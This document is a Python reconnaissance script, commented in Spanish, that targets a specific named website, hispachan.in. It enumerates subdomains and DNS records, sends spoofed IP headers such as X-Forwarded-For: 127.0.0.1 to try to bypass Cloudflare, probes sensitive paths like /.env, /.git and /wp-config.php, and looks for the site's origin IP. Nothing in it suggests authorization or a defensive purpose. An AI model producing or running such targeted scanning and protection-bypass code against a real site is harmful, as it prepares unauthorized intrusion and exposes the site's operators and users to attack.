#!/usr/bin/env python3
import requests
import socket
import ssl
import subprocess
import json
import time
import random
from urllib.parse import urlparse
import dns.resolver
import sys

TARGET = "hispachan.in"
TARGET_URL = "https://hispachan.in/"

print("[*] Iniciando reconocimiento avanzado de", TARGET)

# User agents para rotar
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "curl/7.68.0",
    "python-requests/2.25.1"
]

def check_subdomains():
    """Buscar subdominios"""
    print("\n[+] Buscando subdominios...")
    subdomains = [
        "www", "mail", "ftp", "admin", "cpanel", "webmail", "api", "test", "dev",
        "staging", "beta", "alpha", "demo", "portal", "secure", "vpn", "remote",
        "blog", "forum", "shop", "store", "cdn", "img", "images", "static",
        "assets", "media", "upload", "downloads", "files", "backup", "old",
        "new", "mobile", "m", "app", "panel", "login", "register", "dashboard"
    ]
    
    found = []
    for sub in subdomains:
        try:
            domain = f"{sub}.{TARGET}"
            ip = socket.gethostbyname(domain)
            print(f"  [!] Encontrado: {domain} -> {ip}")
            found.append((domain, ip))
        except:
            pass
    return found

def check_dns_records():
    """Verificar registros DNS"""
    print("\n[+] Verificando registros DNS...")
    records = {}
    
    try:
        # Intentar obtener diferentes registros
        for record_type in ['A', 'AAAA', 'MX', 'TXT', 'NS', 'SOA']:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = ['8.8.8.8', '1.1.1.1']
                answers = resolver.resolve(TARGET, record_type)
                records[record_type] = [str(rdata) for rdata in answers]
                print(f"  {record_type}: {records[record_type]}")
            except:
                pass
    except:
        pass
    
    return records

def bypass_cloudflare_methods():
    """Intentar diferentes métodos para bypasear Cloudflare"""
    print("\n[+] Intentando bypasear Cloudflare...")
    
    methods = []
    
    # Método 1: Headers especiales
    headers_list = [
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"CF-IPCountry": "XX"},
        {"CF-RAY": ""},
        {"True-Client-IP": "127.0.0.1"}
    ]
    
    for headers in headers_list:
        try:
            headers["User-Agent"] = random.choice(user_agents)
            r = requests.get(TARGET_URL, headers=headers, timeout=5, allow_redirects=False)
            if r.status_code != 403:
                print(f"  [!] Posible bypass con headers: {headers}")
                methods.append(("headers", headers, r.status_code))
        except:
            pass
    
    # Método 2: Buscar IP real en servicios externos
    print("\n[+] Buscando IP real en servicios externos...")
    
    services = [
        f"http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi?q={TARGET}",
        f"https://dnsdumpster.com/",
        f"https://censys.io/ipv4?q={TARGET}",
        f"https://shodan.io/search?query={TARGET}"
    ]
    
    for service in services:
        try:
            print(f"  Verificando: {service}")
        except:
            pass
    
    return methods

def scan_common_paths():
    """Escanear paths comunes"""
    print("\n[+] Escaneando paths comunes...")
    
    paths = [
        "/", "/admin", "/login", "/wp-admin", "/administrator", "/.git",
        "/robots.txt", "/sitemap.xml", "/.htaccess", "/config.php",
        "/wp-config.php", "/configuration.php", "/web.config", "/backup",
        "/.env", "/api", "/v1", "/graphql", "/.well-known", "/cgi-bin",
        "/phpmyadmin", "/phpMyAdmin", "/pma", "/adminer", "/server-status",
        "/server-info", "/.svn", "/.hg", "/console", "/debug", "/trace",
        "/elmah.axd", "/swagger", "/api-docs", "/actuator", "/metrics"
    ]
    
    session = requests.Session()
    found_paths = []
    
    for path in paths:
        try:
            url = TARGET_URL.rstrip('/') + path
            headers = {"User-Agent": random.choice(user_agents)}
            r = session.get(url, headers=headers, timeout=3, allow_redirects=False)
            if r.status_code not in [403, 404]:
                print(f"  [!] {path} -> {r.status_code}")
                found_paths.append((path, r.status_code))
        except:
            pass
    
    return found_paths

def check_origin_ip():
    """Intentar encontrar la IP de origen real"""
    print("\n[+] Buscando IP de origen real...")
    
    # Verificar histórico de DNS
    print("  Verificando histórico de DNS...")
    
    # Verificar certificados SSL
    print("  Verificando certificados SSL...")
    
    # Buscar en Internet Archive
    print("  Verificando Internet Archive...")
    
    return []

def main():
    print("="*60)
    print("RECONOCIMIENTO AVANZADO DE HISPACHAN.IN")
    print("="*60)
    
    # DNS y subdominios
    subdomains = check_subdomains()
    dns_records = check_dns_records()
    
    # Bypass Cloudflare
    bypass_methods = bypass_cloudflare_methods()
    
    # Escaneo de paths
    paths = scan_common_paths()
    
    # IP de origen
    origin_ips = check_origin_ip()
    
    print("\n" + "="*60)
    print("RESUMEN DE RESULTADOS")
    print("="*60)
    
    if subdomains:
        print(f"\n[*] Subdominios encontrados: {len(subdomains)}")
    
    if bypass_methods:
        print(f"\n[*] Métodos de bypass encontrados: {len(bypass_methods)}")
    
    if paths:
        print(f"\n[*] Paths accesibles: {len(paths)}")

if __name__ == "__main__":
    try:
        # Instalar dependencias si no están
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "dnspython", "-q"], check=False)
    except:
        pass
    
    main()